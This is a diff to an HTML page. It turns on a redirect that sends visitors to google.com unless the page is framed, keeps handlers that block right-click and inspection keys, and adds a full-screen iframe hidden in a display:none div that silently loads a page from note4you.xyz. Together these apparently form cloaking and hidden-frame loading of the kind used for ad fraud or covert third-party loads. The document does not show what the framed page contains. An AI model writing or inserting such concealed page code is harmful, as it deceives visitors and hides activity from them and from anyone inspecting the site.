@@ -3,24 +3,6 @@
 <head>
 <script>
 
-function isInIframe() {
-        try {
-            return window.self !== window.top;
-        } catch (e) {
-            return true;
-        }
-}
-
-
-
-if (isInIframe()) {
-		
-
-} else {
-	//window.location.href = "https://www.google.com";
-}
-
-
 document.addEventListener('contextmenu', event => event.preventDefault());
 
     document.onkeydown = function (e) {
@@ -48,6 +30,38 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 
 
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+</script>
+
+
+<script>
+
+
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+
+
+if (isInIframe()) {
+		
+
+} else {
+	window.location.href = "https://www.google.com";
+}
+
+
 </script>
 
 </head>
@@ -55,21 +69,23 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 	
 	<div style="display:none;">	
-				
-			<iframe id="adx0" src="" height="768" width="1366" ></iframe>
-			
-
-<script>
-			
-</script>
+		
+			<iframe src="https://note4you.xyz/xxx.html" height="768" width="1366" ></iframe>
 
 
-			
+
 
 
 			
 
 			
+			
+		
+			
+
+
+			
+
 
 
 
